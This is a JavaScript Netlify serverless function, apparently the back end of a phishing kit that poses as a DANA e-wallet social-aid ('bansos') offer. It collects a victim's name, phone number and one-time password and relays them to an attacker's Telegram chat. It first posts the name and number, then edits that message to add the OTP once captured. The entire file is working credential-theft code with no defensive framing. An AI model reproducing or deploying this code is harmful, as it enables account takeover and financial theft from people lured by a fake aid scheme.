// netlify/functions/send-dana-bansos.js
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

exports.handler = async (event) => {
  // Hanya izinkan method POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  // Parse body
  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (e) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: 'Invalid JSON' })
    };
  }

  const { action, nama, phone, otp, messageId } = payload;

  if (!action) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: 'Missing action' })
    };
  }

  // Fungsi untuk mengirim pesan baru
  const sendMessage = async (text) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data.result.message_id;
  };

  // Fungsi untuk mengedit pesan
  const editMessage = async (messageId, text) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        message_id: messageId,
        text: text,
        parse_mode: 'HTML'
      })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data.ok;
  };

  try {
    if (action === 'send') {
      if (!nama || !phone) {
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Missing nama or phone for send action' })
        };
      }
      const pesanAwal = `├• AKUN | DANA BANSOS \n├───────────────────\n├• NAMA : ${nama}\n├───────────────────\n├• NO HP  : ${phone}\n├───────────────────\n├• OTP : \n╰───────────────────`;
      const newMessageId = await sendMessage(pesanAwal);
      return {
        statusCode: 200,
        body: JSON.stringify({ success: true, messageId: newMessageId })
      };
    } 
    else if (action === 'edit') {
      if (!messageId || !otp || !nama || !phone) {
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Missing messageId, otp, nama, or phone for edit action' })
        };
      }
      const pesanLengkap = `├• AKUN | DANA BANSOS \n├───────────────────\n├• NAMA : ${nama}\n├───────────────────\n├• NO HP  : ${phone}\n├───────────────────\n├• OTP : ${otp}\n╰───────────────────`;
      await editMessage(messageId, pesanLengkap);
      return {
        statusCode: 200,
        body: JSON.stringify({ success: true })
      };
    } 
    else {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Invalid action' })
      };
    }
  } catch (error) {
    console.error('Telegram API error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};
